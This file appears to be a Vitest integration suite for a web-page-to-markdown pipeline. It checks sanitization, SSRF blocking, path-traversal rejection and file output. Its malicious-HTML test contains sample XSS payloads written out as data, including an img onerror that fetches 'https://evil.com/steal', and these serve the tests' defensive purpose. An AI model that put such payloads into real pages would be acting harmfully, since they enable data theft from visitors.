import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';

// ---------------------------------------------------------------------------
// Mock declarations — vi.mock factories are hoisted above all imports
// ---------------------------------------------------------------------------

vi.mock('undici', () => ({
  fetch: vi.fn(function () {}),
}));

vi.mock('node:dns/promises', () => {
  const mockResolve4 = vi.fn(function () {});
  const mockResolve6 = vi.fn(function () {});
  const MockResolver = vi.fn(function (this: { resolve4: any; resolve6: any }) {
    this.resolve4 = mockResolve4;
    this.resolve6 = mockResolve6;
  });
  return {
    Resolver: MockResolver,
    __mockResolve4: mockResolve4,
    __mockResolve6: mockResolve6,
  };
});

vi.mock('node:fs/promises', async (importOriginal) => {
  const actual = await importOriginal();
  const mockMkdir = vi.fn();
  const mockWriteFile = vi.fn();
  return {
    ...(actual as object),
    default: {
      ...(actual as object),
      mkdir: mockMkdir,
      writeFile: mockWriteFile,
    },
    mkdir: mockMkdir,
    writeFile: mockWriteFile,
    __actual: actual,
  };
});

vi.mock('node:path', async (importOriginal) => {
  const actual = await importOriginal();
  const actualDefault = (actual.default ?? actual) as typeof import('node:path');
  // Delegate to real implementation by default so top-level module code works
  const mockResolve = vi.fn((...args: Parameters<typeof actualDefault.resolve>) =>
    actualDefault.resolve(...args),
  );
  const mockDirname = vi.fn((...args: Parameters<typeof actualDefault.dirname>) =>
    actualDefault.dirname(...args),
  );
  return {
    ...(actual as object),
    default: {
      ...(actualDefault as object),
      resolve: mockResolve,
      dirname: mockDirname,
    },
    resolve: mockResolve,
    dirname: mockDirname,
    __actual: actual,
  };
});

// ---------------------------------------------------------------------------
// Imports — after mocks are registered
// ---------------------------------------------------------------------------

import * as undici from 'undici';
import * as dnsPromises from 'node:dns/promises';
import * as mockFs from 'node:fs/promises';
import * as mockPath from 'node:path';

import { fetchPage } from '../src/fetcher';
import { sanitize } from '../src/sanitizer';
import { convert } from '../src/converter';
import { output } from '../src/output';
import {
  WebPageResult,
  PipelineError,
  FetchError,
  OutputError,
  DEFAULT_PIPELINE_OPTIONS,
} from '../src/types';

// ---------------------------------------------------------------------------
// Mock references
// ---------------------------------------------------------------------------

const mockFetch = (undici as any).fetch;
const mockResolve4 = (dnsPromises as any).__mockResolve4;
const mockResolve6 = (dnsPromises as any).__mockResolve6;
const mockMkdir = (mockFs.default as any).mkdir as ReturnType<typeof vi.fn>;
const mockWriteFile = (mockFs.default as any).writeFile as ReturnType<typeof vi.fn>;
const mockPathResolve = mockPath.resolve as ReturnType<typeof vi.fn>;
const mockPathDirname = mockPath.dirname as ReturnType<typeof vi.fn>;
const actualFs = (mockFs as any).__actual;
const actualPath = (mockPath as any).__actual;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Build a mock HTTP response object matching what undici returns. */
function buildMockResponse(
  status: number = 200,
  statusText: string = 'OK',
  body?: string,
  headers: Record<string, string> = {},
  url: string = 'https://example.com/',
): object {
  const bodyText = body ?? '';
  const encoder = new TextEncoder();
  const encoded = encoder.encode(bodyText);

  const stream = new ReadableStream<Uint8Array>({
    start(controller) {
      controller.enqueue(encoded);
      controller.close();
    },
  });

  const headerList: [string, string][] = Object.entries(headers).map(
    ([k, v]) => [k.toLowerCase(), v],
  );

  return {
    status,
    statusText,
    headers: {
      get(name: string) {
        const key = name.toLowerCase();
        const entry = headerList.find(([k]) => k === key);
        return entry ? entry[1] : null;
      },
      keys() {
        return headerList.map(([k]) => k)[Symbol.iterator]();
      },
      entries() {
        return headerList[Symbol.iterator]();
      },
      [Symbol.iterator]() {
        return headerList[Symbol.iterator]();
      },
    },
    body: stream,
    url,
    ok: status >= 200 && status < 300,
    redirected: false,
    type: 'basic' as const,
    redirected_count: 0,
  };
}

/** Build a minimal WebPageResult for tests. */
function buildResult(overrides?: Partial<WebPageResult>): WebPageResult {
  return {
    html: '<html><head><title>Test Page</title></head><body><p>Hello</p></body></html>',
    url: 'https://example.com/',
    title: 'Test Page',
    contentType: 'text/html; charset=utf-8',
    ...overrides,
  };
}

/** Capture stdout / stderr writes. */
let capturedStdout: string[] = [];
let capturedStderr: string[] = [];

function captureStdio() {
  capturedStdout = [];
  capturedStderr = [];
  vi.spyOn(process.stdout, 'write').mockImplementation((chunk: string) => {
    capturedStdout.push(chunk);
    return true;
  });
  vi.spyOn(process.stderr, 'write').mockImplementation((chunk: string) => {
    capturedStderr.push(chunk);
    return true;
  });
}

function restoreStdio() {
  process.stdout.write.mockRestore();
  process.stderr.write.mockRestore();
}

/** Configure path mocks to resolve relative to cwd (for mocked tests). */
function setupPathMocks() {
  mockPathResolve.mockImplementation((filePath: string | undefined, ...rest: string[]) => {
    if (!filePath) return actualPath.resolve(...[filePath, ...rest] as never[]);
    if (filePath.startsWith('/')) return filePath;
    return process.cwd() + '/' + filePath;
  });
  mockPathDirname.mockImplementation((filePath: string) => {
    const lastSlash = filePath.lastIndexOf('/');
    return lastSlash > 0 ? filePath.slice(0, lastSlash) : '/';
  });
  mockMkdir.mockResolvedValue(undefined);
  mockWriteFile.mockResolvedValue(undefined);
}

/** Restore path/fs mocks to delegate to real implementations (for file output tests). */
function useRealFsAndPath() {
  const actualDefault = (actualPath.default ?? actualPath) as typeof import('node:path');
  mockPathResolve.mockImplementation(actualDefault.resolve.bind(actualDefault));
  mockPathDirname.mockImplementation(actualDefault.dirname.bind(actualDefault));
  mockMkdir.mockImplementation(actualFs.mkdir.bind(actualFs));
  mockWriteFile.mockImplementation(actualFs.writeFile.bind(actualFs));
}

/** Clear mock call history without resetting implementations. */
function clearMockCalls() {
  mockFetch.mockClear();
  mockResolve4.mockClear();
  mockResolve6.mockClear();
  mockMkdir.mockClear();
  mockWriteFile.mockClear();
  mockPathResolve.mockClear();
  mockPathDirname.mockClear();
}

// ---------------------------------------------------------------------------
// 1. Full pipeline — simple HTML (mocked fetcher)
// ---------------------------------------------------------------------------

describe('Full pipeline — simple HTML', () => {
  beforeEach(() => {
    vi.useFakeTimers();
    vi.clearAllMocks();
    mockFetch.mockReset();
    mockResolve4.mockReset();
    mockResolve6.mockReset();
    mockResolve4.mockResolvedValue([]);
    mockResolve6.mockResolvedValue([]);
    setupPathMocks();
    captureStdio();
  });

  afterEach(() => {
    vi.useRealTimers();
    restoreStdio();
  });

  it('fetches, sanitizes, converts, and outputs correct markdown', async () => {
    const html =
      '<html><head><title>Test Page</title></head><body><h1>Hello</h1><p>Welcome to the test page.</p></body></html>';

    mockFetch.mockResolvedValue(
      buildMockResponse(200, 'OK', html, { 'content-type': 'text/html; charset=utf-8' }),
    );

    // Stage 1: Fetch
    const result = await fetchPage('https://example.com/', DEFAULT_PIPELINE_OPTIONS.fetch);
    expect(result.html).toBe(html);
    expect(result.title).toBe('Test Page');
    expect(result.url).toBe('https://example.com/');
    expect(result.contentType).toBe('text/html; charset=utf-8');

    // Stage 2: Sanitize
    const cleanHtml = sanitize(result.html, DEFAULT_PIPELINE_OPTIONS.sanitize);
    expect(cleanHtml).toContain('<h1>Hello</h1>');
    expect(cleanHtml).toContain('<p>Welcome to the test page.</p>');

    // Stage 3: Convert
    const markdown = convert(cleanHtml, DEFAULT_PIPELINE_OPTIONS.convert);
    expect(markdown).toContain('# Hello');
    expect(markdown).toContain('Welcome to the test page.');

    // Stage 4: Output (stdout)
    await output(markdown, result, DEFAULT_PIPELINE_OPTIONS.output);

    // Verify stdout received the markdown
    expect(capturedStdout).toContain(markdown);
    expect(capturedStderr).toEqual([]);
  });

  it('full pipeline preserves title and metadata through all stages', async () => {
    const html =
      '<html><head><title>My Blog</title></head><body><h2>Post Title</h2><p>Some content here.</p><a href="https://example.com/link">A link</a></body></html>';

    mockFetch.mockResolvedValue(
      buildMockResponse(200, 'OK', html, { 'content-type': 'text/html' }, 'https://example.com/blog'),
    );

    const result = await fetchPage('https://example.com/blog');
    expect(result.title).toBe('My Blog');

    const cleanHtml = sanitize(result.html);
    const markdown = convert(cleanHtml);
    await output(markdown, result, { pretty: true, filePath: undefined });

    const fullOutput = capturedStdout[0];
    expect(fullOutput).toContain('# Fetched Web Page');
    expect(fullOutput).toContain('**Source:** https://example.com/blog');
    expect(fullOutput).toContain('**Title:** My Blog');
    expect(fullOutput).toContain('## Post Title');
    expect(fullOutput).toContain('Some content here.');
    expect(fullOutput).toContain('[A link](https://example.com/link)');
  });
});

// ---------------------------------------------------------------------------
// 2. Full pipeline — malicious HTML (XSS vectors removed, safe content preserved)
// ---------------------------------------------------------------------------

describe('Full pipeline — malicious HTML', () => {
  beforeEach(() => {
    vi.useFakeTimers();
    vi.clearAllMocks();
    mockFetch.mockReset();
    mockResolve4.mockReset();
    mockResolve6.mockReset();
    mockResolve4.mockResolvedValue([]);
    mockResolve6.mockResolvedValue([]);
    setupPathMocks();
    captureStdio();
  });

  afterEach(() => {
    vi.useRealTimers();
    restoreStdio();
  });

  it('removes XSS vectors through the full pipeline', async () => {
    const maliciousHtml = [
      '<html><head><title>Vulnerable</title></head><body>',
      '<h1>Safe Heading</h1>',
      '<p>Safe paragraph</p>',
      '<script>alert("xss")</script>',
      '<img src="missing.png" onerror="fetch(\'https://evil.com/steal\')">',
      '<a href="javascript:alert(1)">Click me</a>',
      '<div style="background: url(javascript:alert(1))">styled div</div>',
      '<!-- hidden comment with <script>evil</script> -->',
      '<p>Another safe paragraph</p>',
      '</body></html>',
    ].join('\n');

    mockFetch.mockResolvedValue(
      buildMockResponse(200, 'OK', maliciousHtml, { 'content-type': 'text/html' }),
    );

    const result = await fetchPage('https://example.com/');
    const cleanHtml = sanitize(result.html, DEFAULT_PIPELINE_OPTIONS.sanitize);
    const markdown = convert(cleanHtml, DEFAULT_PIPELINE_OPTIONS.convert);
    await output(markdown, result);

    // XSS vectors must be removed
    expect(cleanHtml).not.toContain('<script');
    expect(cleanHtml).not.toContain('alert');
    expect(cleanHtml).not.toContain('onerror');
    expect(cleanHtml).not.toContain('javascript:');
    expect(cleanHtml).not.toContain('evil.com');
    expect(cleanHtml).not.toContain('<!--');

    // Safe content must survive
    expect(cleanHtml).toContain('<h1>Safe Heading</h1>');
    expect(cleanHtml).toContain('<p>Safe paragraph</p>');
    expect(cleanHtml).toContain('<p>Another safe paragraph</p>');

    // Markdown output should be clean
    expect(markdown).toContain('# Safe Heading');
    expect(markdown).toContain('Safe paragraph');
    expect(markdown).not.toContain('alert');
    expect(markdown).not.toContain('evil');

    // Stdout should receive clean markdown
    expect(capturedStdout[0]).not.toContain('alert');
    expect(capturedStdout[0]).not.toContain('evil');
  });

  it('safe content survives sanitization in the pipeline', async () => {
    const mixedHtml = [
      '<html><body>',
      '<h1>Main Title</h1>',
      '<p>Intro text <strong>with bold</strong> and <em>italic</em>.</p>',
      '<ul><li>Item 1</li><li>Item 2</li></ul>',
      '<script>nasty stuff</script>',
      '<a href="https://safe.example.com">Safe link</a>',
      '<img src="https://cdn.example.com/photo.jpg" alt="A photo">',
      '</body></html>',
    ].join('\n');

    mockFetch.mockResolvedValue(
      buildMockResponse(200, 'OK', mixedHtml),
    );

    const result = await fetchPage('https://example.com/');
    const cleanHtml = sanitize(result.html);
    const markdown = convert(cleanHtml);

    // Safe elements preserved
    expect(cleanHtml).toContain('<h1>Main Title</h1>');
    expect(cleanHtml).toContain('<strong>with bold</strong>');
    expect(cleanHtml).toContain('<em>italic</em>');
    expect(cleanHtml).toContain('<a href="https://safe.example.com">Safe link</a>');
    expect(cleanHtml).toContain('<img src="https://cdn.example.com/photo.jpg"');

    // Dangerous elements removed
    expect(cleanHtml).not.toContain('<script');
    expect(cleanHtml).not.toContain('nasty stuff');

    // Markdown conversion correct
    expect(markdown).toContain('# Main Title');
    expect(markdown).toContain('**with bold**');
    expect(markdown).toContain('*italic*');
    expect(markdown).toContain('[Safe link](https://safe.example.com)');
  });
});



// ---------------------------------------------------------------------------
// 4. Error propagation through pipeline
// ---------------------------------------------------------------------------

describe('Error propagation through pipeline', () => {
  beforeEach(() => {
    vi.useFakeTimers();
    vi.clearAllMocks();
    mockFetch.mockReset();
    mockResolve4.mockReset();
    mockResolve6.mockReset();
    mockResolve4.mockResolvedValue([]);
    mockResolve6.mockResolvedValue([]);
    setupPathMocks();
    captureStdio();
  });

  afterEach(() => {
    vi.useRealTimers();
    restoreStdio();
  });

  it('fetcher errors propagate as FetchError', async () => {
    mockFetch.mockRejectedValue(
      Object.assign(new Error('ECONNREFUSED 93.184.216.34:80'), {
        name: 'Error',
        code: 'ECONNREFUSED',
      }),
    );

    await expect(
      fetchPage('https://example.com/', DEFAULT_PIPELINE_OPTIONS.fetch),
    ).rejects.toThrow(FetchError);
  });

  it('fetcher SSRF errors propagate as FetchError', async () => {
    // Private IP is blocked during URL validation (before fetch)
    await expect(
      fetchPage('http://127.0.0.1/', DEFAULT_PIPELINE_OPTIONS.fetch),
    ).rejects.toThrow(FetchError);
    await expect(
      fetchPage('http://127.0.0.1/', DEFAULT_PIPELINE_OPTIONS.fetch),
    ).rejects.toThrow(/private IPv4/);
  });

  it('fetcher timeout errors propagate as FetchError', async () => {
    vi.useRealTimers();

    let pendingTimeout: ReturnType<typeof setTimeout> | null = null;
    mockFetch.mockImplementation((_url: string, init: { signal: any }) => {
      return new Promise((resolve, reject) => {
        pendingTimeout = setTimeout(() => resolve(buildMockResponse()), 5000);
        init.signal.addEventListener('abort', () => {
          clearTimeout(pendingTimeout!);
          reject(new DOMException('The operation was aborted.', 'AbortError'));
        });
      });
    });

    await expect(
      fetchPage('https://example.com/', { ...DEFAULT_PIPELINE_OPTIONS.fetch, timeout: 50 }),
    ).rejects.toThrow(FetchError);
    await expect(
      fetchPage('https://example.com/', { ...DEFAULT_PIPELINE_OPTIONS.fetch, timeout: 50 }),
    ).rejects.toThrow(/timed out/);

    vi.useFakeTimers();
  }, 5000);

  it('output errors propagate as OutputError', async () => {
    // Use a relative path within cwd so the traversal guard passes,
    // then writeFile rejects to trigger the error path.
    mockWriteFile.mockRejectedValue(new Error('EACCES: permission denied'));

    await expect(
      output('# Hello', buildResult(), { filePath: 'no-perm/file.md', pretty: false }),
    ).rejects.toThrow(OutputError);
  });

  it('output errors for invalid paths propagate as OutputError', async () => {
    // Empty path — writeToFile catches this directly
    // (output() skips writeToFile for falsy filePath, so test writeToFile directly)
    await expect(
      (await import('../src/output')).writeToFile('# Hello', ''),
    ).rejects.toThrow(OutputError);
    await expect(
      (await import('../src/output')).writeToFile('# Hello', ''),
    ).rejects.toThrow(/must not be empty/);

    // Null byte in path
    await expect(
      (await import('../src/output')).writeToFile('# Hello', 'file\0.txt'),
    ).rejects.toThrow(OutputError);
    await expect(
      (await import('../src/output')).writeToFile('# Hello', 'file\0.txt'),
    ).rejects.toThrow(/null bytes/);

    // Path outside cwd — override path mock to resolve outside cwd
    mockPathResolve.mockReturnValue('/tmp/evil.txt');
    await expect(
      (await import('../src/output')).writeToFile('# Hello', '../../../tmp/evil.txt'),
    ).rejects.toThrow(OutputError);
    await expect(
      (await import('../src/output')).writeToFile('# Hello', '../../../tmp/evil.txt'),
    ).rejects.toThrow(/resolves outside/);
  });
});

// ---------------------------------------------------------------------------
// 5. File output end-to-end — real filesystem with temp directory
// ---------------------------------------------------------------------------

describe('File output end-to-end', () => {
  let tempDir: string | null = null;

  beforeEach(async () => {
    vi.clearAllMocks();
    mockFetch.mockReset();
    mockResolve4.mockReset();
    mockResolve6.mockReset();
    mockResolve4.mockResolvedValue([]);
    mockResolve6.mockResolvedValue([]);
    captureStdio();

    // Create temp directory inside cwd so the traversal guard passes.
    // mkdtemp needs an absolute prefix template, so resolve a subdir within cwd.
    const prefix = actualPath.resolve(process.cwd(), 'test-integration-');
    tempDir = await actualFs.mkdtemp(prefix);

    // Reconfigure mocks to delegate to real fs/path
    useRealFsAndPath();
  });

  afterEach(async () => {
    restoreStdio();

    // Clean up temp directory
    if (tempDir) {
      await actualFs.rm(tempDir, { recursive: true, force: true }).catch(() => {});
      tempDir = null;
    }

    // Restore mocked fs/path for other test suites
    setupPathMocks();
  });

  it('creates file with correct content in temp directory', async () => {
    const html =
      '<html><head><title>File Test</title></head><body><h1>Report</h1><p>Generated content.</p></body></html>';

    mockFetch.mockResolvedValue(
      buildMockResponse(200, 'OK', html, { 'content-type': 'text/html' }),
    );

    const filePath = tempDir! + '/output.md';

    // Full pipeline: fetch → sanitize → convert → output to file
    const result = await fetchPage('https://example.com/');
    const cleanHtml = sanitize(result.html);
    const markdown = convert(cleanHtml);
    await output(markdown, result, { filePath, pretty: false });

    // Verify file was created
    const fileContent = await actualFs.readFile(filePath, 'utf-8');

    // Content should be the markdown (no pretty header since pretty: false)
    expect(fileContent).toContain('# Report');
    expect(fileContent).toContain('Generated content.');
    expect(fileContent).not.toContain('# Fetched Web Page');

    // Stderr should have the "Output written to" message
    expect(capturedStderr).toContain(`Error: Output written to ${filePath}\n`);

    // Stdout should be empty (file output, not stdout)
    expect(capturedStdout).toEqual([]);
  });

  it('file output with pretty header includes metadata', async () => {
    const html =
      '<html><head><title>Pretty Page</title></head><body><h2>Section</h2><p>Content here.</p></body></html>';

    mockFetch.mockResolvedValue(
      buildMockResponse(200, 'OK', html, { 'content-type': 'text/html; charset=utf-8' }),
    );

    const filePath = tempDir! + '/pretty.md';

    const result = await fetchPage('https://example.com/');
    const cleanHtml = sanitize(result.html);
    const markdown = convert(cleanHtml);
    await output(markdown, result, { filePath, pretty: true });

    const fileContent = await actualFs.readFile(filePath, 'utf-8');

    // Pretty header should be present
    expect(fileContent).toContain('# Fetched Web Page');
    expect(fileContent).toContain('**Source:** https://example.com/');
    expect(fileContent).toContain('**Title:** Pretty Page');
    expect(fileContent).toContain('**Content-Type:** text/html; charset=utf-8');
    expect(fileContent).toContain('**Fetched:**');
    expect(fileContent).toContain('---');

    // Body markdown should follow the header
    expect(fileContent).toContain('## Section');
    expect(fileContent).toContain('Content here.');
  });

  it('creates nested directories automatically', async () => {
    const html = '<html><body><p>Nested</p></body></html>';

    mockFetch.mockResolvedValue(
      buildMockResponse(200, 'OK', html),
    );

    const nestedPath = tempDir! + '/subdir/deep/output.md';

    const result = await fetchPage('https://example.com/');
    const cleanHtml = sanitize(result.html);
    const markdown = convert(cleanHtml);
    await output(markdown, result, { filePath: nestedPath });

    const fileContent = await actualFs.readFile(nestedPath, 'utf-8');
    expect(fileContent).toContain('Nested');
  });
});
